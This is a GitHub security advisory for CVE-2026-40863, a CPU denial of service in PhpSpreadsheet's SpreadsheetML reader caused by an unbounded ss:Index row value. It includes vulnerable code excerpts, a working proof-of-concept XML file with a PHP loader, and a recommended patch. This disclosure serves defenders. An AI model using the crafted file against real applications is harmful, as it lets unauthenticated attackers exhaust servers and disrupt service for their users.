# [H] PhpSpreadsheet has CPU Denial of Service via Unbounded Row Index in SpreadsheetML XML Reader

## Summary
Severity: High
Advisory: GHSA-84wq-86v6-x5j6
CVE: CVE-2026-40863
CWE: CWE-400, CWE-770
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-84wq-86v6-x5j6
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.7.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.16
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.4

## Details
## Summary

The SpreadsheetML XML reader (`Reader\Xml`) does not validate the `ss:Index` row attribute against the maximum allowed row count (`AddressRange::MAX_ROW = 1,048,576`). An attacker can craft a SpreadsheetML XML file with `ss:Index="999999999"` on a `<Row>` element, which inflates the internal `cachedHighestRow` to ~1 billion. Any subsequent call to `getRowIterator()` without an explicit end row will attempt to iterate ~1 billion rows, causing CPU exhaustion and denial of service.

## Details

In `src/PhpSpreadsheet/Reader/Xml.php`, the `loadSpreadsheetFromFile` method processes `<Row>` elements:

```php
// Xml.php:397-402
if (isset($row_ss['Index'])) {
    $rowID = (int) $row_ss['Index']; // No validation against MAX_ROW
}
if (isset($row_ss['Hidden'])) {
    $rowVisible = ((string) $row_ss['Hidden']) !== '1';
    $spreadsheet->getActiveSheet()->getRowDimension($rowID)->setVisible($rowVisible);
}
```

The `$rowID` value read from `ss:Index` is cast to int with no upper bound check. It is then passed to `getRowDimension()`:

```php
// Worksheet.php:1342-1351
public function getRowDimension(int $row): RowDimension
{
    if (!isset($this->rowDimensions[$row])) {
        $this->rowDimensions[$row] = new RowDimension($row);
        $this->cachedHighestRow = max($this->cachedHighestRow, $row);
    }
    return $this->rowDimensions[$row];
}
```

This inflates `cachedHighestRow` to the attacker-controlled value. Additionally, at line 412, `$cellRange = $columnID . $rowID` is constructed and passed to `getCell()`, which calls `createNewCell()` (Worksheet.php:1294) and also sets `cachedHighestRow`.

The `RowIterator` constructor uses `getHighestRow()` as its default end row:

```php
// RowIterator.php:84-88
public function resetEnd(?int $endRow = null): static
{
    $this->endRow = $endRow ?: $this->subject->getHighestRow();
    return $this;
}
```

With `cachedHighestRow` at ~1 billion, iterating over rows causes CPU exhaustion. The `DefaultReadFilter` provides no protection — it returns `true` for all cells.

Even without the `Hidden` attribute, any cell data within the row still uses the inflated `$rowID` at line 412, so the `ss:Hidden` attribute is not required to trigger the vulnerability.

## PoC

1. Create `poc.xml`:
```xml
<?xml version="1.0"?>
<?mso-application progid="Excel.Sheet"?>
<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"
 xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">
 <Worksheet ss:Name="Sheet1">
  <Table>
   <Row ss:Index="999999999" ss:Hidden="1"/>
   <Row><Cell><Data ss:Type="String">test</Data></Cell></Row>
  </Table>
 </Worksheet>
</Workbook>
```

2. Load and iterate:
```php
<?php
require 'vendor/autoload.php';
use PhpOffice\PhpSpreadsheet\IOFactory;

$reader = IOFactory::createReader('Xml');
$spreadsheet = $reader->load('poc.xml');
$sheet = $spreadsheet->getActiveSheet();

echo "Highest row: " . $sheet->getHighestRow() . "\n";
// Outputs: Highest row: 1000000000

// This loop will attempt ~1 billion iterations → CPU exhaustion
foreach ($sheet->getRowIterator() as $row) {
    // Never completes
}
```

## Impact

Any PHP application that processes user-uploaded SpreadsheetML XML files using PhpSpreadsheet is vulnerable. An attacker can cause denial of service by:

- Exhausting server CPU with a single small XML file (~300 bytes)
- Blocking the PHP worker process, potentially affecting all concurrent users
- Triggering PHP max_execution_time limits that still consume resources before killing the process

The attack requires no authentication — only the ability to upload or cause the application to process a crafted SpreadsheetML file.

## Recommended Fix

Add MAX_ROW validation after reading the `ss:Index` attribute in `src/PhpSpreadsheet/Reader/Xml.php`:

```php
// After line 398:
if (isset($row_ss['Index'])) {
    $rowID = (int) $row_ss['Index'];
    if ($rowID > AddressRange::MAX_ROW) {
        $rowID = AddressRange::MAX_ROW;
    }
}
```

Add the necessary import at the top of the file:
```php
use PhpOffice\PhpSpreadsheet\Cell\AddressRange;
```

The same validation should also be applied to the `ss:Index` attribute on `<Cell>` elements (line 409) for the column dimension.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-84wq-86v6-x5j6
- https://nvd.nist.gov/vuln/detail/CVE-2026-40863
- https://github.com/PHPOffice/PhpSpreadsheet
